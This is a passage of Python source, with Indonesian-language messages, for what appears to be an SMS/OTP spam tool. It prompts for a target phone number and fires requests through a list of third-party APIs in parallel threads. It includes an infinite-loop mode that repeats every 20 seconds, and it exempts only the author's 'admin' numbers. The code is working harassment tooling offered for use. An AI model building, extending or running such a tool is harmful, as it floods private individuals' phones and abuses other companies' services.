    print(f"{Fore.CYAN}Memulai spam menggunakan {Fore.WHITE}{total_apis}{Fore.CYAN} API{Style.RESET_ALL}")
    print()
    
    target62 = log_input("Nomor target (08xx / +62xx): ").strip()
    
    if not target62:
        log_error("Nomor tidak boleh kosong!")
        return False
    
    target62 = normalize(target62)
    if not target62:
        log_error("Format nomor tidak valid. Gunakan format 08xx atau +62xx")
        return False
    
    if is_admin_number(target62):
        print()
        log_error("Peringatan! Nomor ini adalah nomor ADMIN.")
        log_error("Tidak diperbolehkan melakukan spam ke nomor admin.")
        log_error("Mohon gunakan nomor target lain.")
        print()
        input("Tekan Enter untuk kembali ke menu...")
        return False
    
    ip = get_public_ip()
    success_count = 0
    total_targets = len(TARGETS)
    
    def signal_handler(sig, frame):
        global stop_flag
        stop_flag = True
        print()
        log_warning("Menghentikan proses...")
        raise KeyboardInterrupt
    
    original_handler = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for idx, api in enumerate(TARGETS):
                if stop_flag:
                    break
                futures.append(executor.submit(process_target, api, target62, ip, idx+1, total_targets))
            
            for future in as_completed(futures):
                if stop_flag:
                    for f in futures:
                        f.cancel()
                    break
                try:
                    if future.result():
                        success_count += 1
                except:
                    pass
    except KeyboardInterrupt:
        pass
    finally:
        signal.signal(signal.SIGINT, original_handler)
    
    if stop_flag:
        log_warning("Proses dihentikan oleh user (Ctrl+C)")
        log_info(f"Total sukses: {success_count}/{total_targets} (sebelum dihentikan)")
    else:
        log_info(f"Selesai. Sukses: {success_count}/{total_targets}")
    
    return success_count > 0

def run_infinite_loop():
    global stop_flag
    stop_flag = False
    
    total_apis = get_active_apis()
    print()
    print(f"{Fore.CYAN}Memulai spam menggunakan {Fore.WHITE}{total_apis}{Fore.CYAN} API{Style.RESET_ALL}")
    print()
    
    log_info("Menjalankan Infinite Loop (delay 20 detik)...")
    target62 = log_input("Nomor target (08xx / +62xx): ").strip()
    
    if not target62:
        log_error("Nomor tidak boleh kosong!")
        return
    
    target62 = normalize(target62)
    if not target62:
        log_error("Format nomor tidak valid. Gunakan format 08xx atau +62xx")
        return
    
    if is_admin_number(target62):
        print()
        log_error("Peringatan! Nomor ini adalah nomor ADMIN.")
        log_error("Tidak diperbolehkan melakukan spam ke nomor admin.")
        log_error("Mohon gunakan nomor target lain.")
        print()
        input("Tekan Enter untuk kembali ke menu...")
        return
    
    ip = get_public_ip()
    total_success = 0
    total_fail = 0
    round_count = 0
    
    def signal_handler(sig, frame):
        global stop_flag
        stop_flag = True
        print()
        log_warning("Menghentikan proses...")
        raise KeyboardInterrupt
    
    original_handler = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        while True:
            if stop_flag:
                break
            round_count += 1
            log_info(f"Round {round_count} dimulai...")
            success_count = 0
            total_targets = len(TARGETS)
            
            with ThreadPoolExecutor(max_workers=5) as executor:
                futures = []
                for idx, api in enumerate(TARGETS):
                    if stop_flag:
                        break
                    futures.append(executor.submit(process_target, api, target62, ip, idx+1, total_targets))
                
                for future in as_completed(futures):
                    if stop_flag:
                        for f in futures:
                            f.cancel()
                        break
                    try:
                        if future.result():
                            success_count += 1
                            total_success += 1
                        else:
                            total_fail += 1
                    except:
                        total_fail += 1
            
            if stop_flag:
                break
                
            log_info(f"Round {round_count} selesai. Sukses: {success_count}/{total_targets}")
            log_info(f"Total: success={total_success} | fail={total_fail}")
            log_info("Menunggu 20 detik...")
            
            for _ in range(20):
                if stop_flag:
                    break
                time.sleep(1)
            
    except KeyboardInterrupt:
        pass
    finally:
        signal.signal(signal.SIGINT, original_handler)
    
    if stop_flag:
        log_warning("Proses dihentikan oleh user (Ctrl+C)")
        log_info(f"Total success: {total_success} | fail: {total_fail}")

def run_custom_thread(threads=5):
    global stop_flag
    stop_flag = False
    
    total_apis = get_active_apis()
    print()
    print(f"{Fore.CYAN}Memulai spam menggunakan {Fore.WHITE}{total_apis}{Fore.CYAN} API{Style.RESET_ALL}")
    print()
    
    log_info(f"Menjalankan dengan {threads} thread...")
    target62 = log_input("Nomor target (08xx / +62xx): ").strip()
    
    if not target62:
        log_error("Nomor tidak boleh kosong!")
        return
    
    target62 = normalize(target62)
    if not target62:
        log_error("Format nomor tidak valid. Gunakan format 08xx atau +62xx")
        return
    
    if is_admin_number(target62):
        print()
        log_error("Peringatan! Nomor ini adalah nomor ADMIN.")
        log_error("Tidak diperbolehkan melakukan spam ke nomor admin.")
        log_error("Mohon gunakan nomor target lain.")
        print()
        input("Tekan Enter untuk kembali ke menu...")
        return
    
    ip = get_public_ip()
    success_count = 0
    total_targets = len(TARGETS)
    
    def signal_handler(sig, frame):
        global stop_flag
        stop_flag = True
        print()
        log_warning("Menghentikan proses...")
        raise KeyboardInterrupt
    
    original_handler = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for idx, api in enumerate(TARGETS):
                if stop_flag:
                    break
                futures.append(executor.submit(process_target, api, target62, ip, idx+1, total_targets))
            
            for future in as_completed(futures):
                if stop_flag:
                    for f in futures:
                        f.cancel()
                    break
                try:
                    if future.result():
                        success_count += 1
                except:
                    pass
    except KeyboardInterrupt:
        pass
    finally:
        signal.signal(signal.SIGINT, original_handler)
    
    if stop_flag:
        log_warning("Proses dihentikan oleh user (Ctrl+C)")
        log_info(f"Total sukses: {success_count}/{total_targets} (sebelum dihentikan)")
    else:
        log_info(f"Selesai. Sukses: {success_count}/{total_targets}")
